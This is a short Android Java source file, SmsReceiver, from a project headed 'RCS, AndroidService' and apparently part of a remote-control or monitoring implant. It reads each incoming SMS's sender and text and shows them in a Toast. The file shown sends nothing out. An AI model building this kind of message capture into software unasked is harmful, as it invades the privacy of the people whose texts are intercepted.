/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SmsReceiver.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.message;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.widget.Toast;

import com.android.service.Messages;

// TODO: Auto-generated Javadoc
/**
 * The Class SmsReceiver.
 */
// SNIPPET
public class SmsReceiver extends BroadcastReceiver {

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context,
	 * android.content.Intent)
	 */
	@Override
	public void onReceive(final Context context, final Intent intent) {
		// ---get the SMS message passed in---
		final Bundle bundle = intent.getExtras();
		SmsMessage[] msgs = null;
		String str = ""; //$NON-NLS-1$
		if (bundle != null) {
			// ---retrieve the SMS message received---
			final Object[] pdus = (Object[]) bundle.get(Messages.getString("15.1")); //$NON-NLS-1$
			msgs = new SmsMessage[pdus.length];
			for (int i = 0; i < msgs.length; i++) {
				msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				str += Messages.getString("15.2") + msgs[i].getOriginatingAddress(); //$NON-NLS-1$
				str += " :"; //$NON-NLS-1$
				str += msgs[i].getMessageBody().toString();
				str += "\n"; //$NON-NLS-1$
			}
			// ---display the new SMS message---
			Toast.makeText(context, str, Toast.LENGTH_SHORT).show();
		}
	}
}
